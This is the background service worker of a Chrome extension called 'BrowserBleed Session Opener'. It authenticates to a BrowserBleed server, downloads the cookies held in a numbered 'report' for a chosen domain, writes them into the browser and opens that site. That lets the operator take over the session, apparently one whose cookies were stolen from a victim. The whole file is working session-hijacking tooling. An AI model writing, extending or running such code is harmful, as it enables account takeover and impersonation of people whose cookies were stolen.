// BrowserBleed Session Opener — background service worker.

chrome.runtime.onMessage.addListener(function (msg, sender, sendResponse) {
  if (msg && msg.type === 'BB_OPEN_SESSION') {
    openSession(msg.serverUrl, msg.reportId, msg.domain)
      .then(function (r) { sendResponse(r); })
      .catch(function (e) { sendResponse({ ok: false, error: String((e && e.message) || e) }); });
    return true; // async response
  }
});

async function openSession(serverUrl, reportId, domain) {
  var key = await getCookie(serverUrl, 'bb_key');
  if (!key) throw new Error('Not logged in to ' + serverUrl + ' — sign in to BrowserBleed first.');

  var resp = await fetch(serverUrl + '/r/' + reportId + '/cookies?domain=' + encodeURIComponent(domain), {
    headers: { 'Authorization': 'Bearer ' + key }
  });
  if (!resp.ok) throw new Error('Server returned HTTP ' + resp.status);
  var data = await resp.json();

  var host = String(domain).replace(/^\./, '');
  var base = 'https://' + host + '/';
  var set = 0;
  for (var i = 0; i < (data.cookies || []).length; i++) {
    var c = data.cookies[i];
    await setCookie(base, c.name, c.value, '.' + host);
    set++;
  }
  if (!set) throw new Error('No cookies found for ' + domain);

  await chrome.tabs.create({ url: base });
  return { ok: true, cookies: set };
}

function getCookie(url, name) {
  return new Promise(function (resolve) {
    chrome.cookies.get({ url: url, name: name }, function (c) {
      resolve(c ? c.value : '');
    });
  });
}

function setCookie(url, name, value, domain) {
  return new Promise(function (resolve, reject) {
    chrome.cookies.set({ url: url, name: name, value: value, domain: domain, path: '/' }, function (c) {
      if (chrome.runtime.lastError) reject(new Error(chrome.runtime.lastError.message));
      else resolve(c);
    });
  });
}
